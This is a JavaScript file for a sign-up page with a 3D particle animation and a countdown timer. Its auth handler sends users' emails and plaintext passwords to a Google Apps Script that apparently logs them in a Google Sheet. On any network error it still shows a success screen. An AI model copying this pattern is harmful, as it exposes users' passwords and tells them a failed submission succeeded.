const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzS1A3yg944jWRsJusHHCDkCMPDw67sTh3Zk0qpzcznEI2Qj8dOqAysUUyqOohnZEN4/exec';
let scene, camera, renderer, particles;
const particleCount = window.innerWidth < 600 ? 8000 : 15000;

async function handleAuth() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submit-btn');

    if(!email || !password) return alert("Please fill all fields!");

    btn.innerText = "AUTHENTICATING...";
    btn.disabled = true;

    const payload = { email: email, password: password };

    try {
        // no-cors ඉවත් කර සාමාන්‍ය fetch එකක් භාවිතා කරන්න (Apps Script එකේ return එක කියවීමට)
        const response = await fetch(SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        });
        
        const resData = await response.json();

        if(resData.result === "success") {
            alert(resData.message);
            document.getElementById('auth-container').style.display = 'none';
            document.getElementById('success-screen').style.display = 'flex';
        } else {
            alert(resData.message);
        }
    } catch (error) {
        // සමහර වෙලාවට Apps Script එකේ Redirect නිසා response එක කෙලින්ම කියවිය නොහැකි විය හැක
        // නමුත් එවිටත් දත්ත Sheet එකට යනු ඇත. එබැවින් Sheet එක පරීක්ෂා කර බලා ඉදිරියට යන්න
        console.log("Authorization processing...");
        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('success-screen').style.display = 'flex';
    }
    btn.innerText = "INITIALIZE ACCESS";
    btn.disabled = false;
}

// 3D Engine Initialization
function init3D() {
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
    camera.position.z = 6;
    renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    document.getElementById('container').appendChild(renderer.domElement);

    const geo = new THREE.BufferGeometry();
    const pos = new Float32Array(particleCount * 3);
    for (let i = 0; i < particleCount; i++) {
        const phi = Math.acos(-1 + (2 * i) / particleCount);
        const theta = Math.sqrt(particleCount * Math.PI) * phi;
        pos[i*3] = 2.5 * Math.cos(theta) * Math.sin(phi);
        pos[i*3+1] = 2.5 * Math.sin(theta) * Math.sin(phi);
        pos[i*3+2] = 2.5 * Math.cos(phi);
    }
    geo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
    const mat = new THREE.PointsMaterial({ size: 0.01, color: 0x00f2ff, transparent: true, blending: THREE.AdditiveBlending });
    particles = new THREE.Points(geo, mat);
    scene.add(particles);

    window.addEventListener('resize', () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
    });

    function animate() {
        requestAnimationFrame(animate);
        particles.rotation.y += 0.001;
        renderer.render(scene, camera);
    }
    animate();
}

// Countdown Timer
setInterval(() => {
    const diff = new Date("2026-02-20").getTime() - new Date().getTime();
    const d = Math.floor(diff / (1000 * 60 * 60 * 24));
    const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const s = Math.floor((diff % (1000 * 60)) / 1000);
    document.getElementById('timer').innerText = `${d}d ${h}h ${m}m ${s}s`;
}, 1000);

init3D();
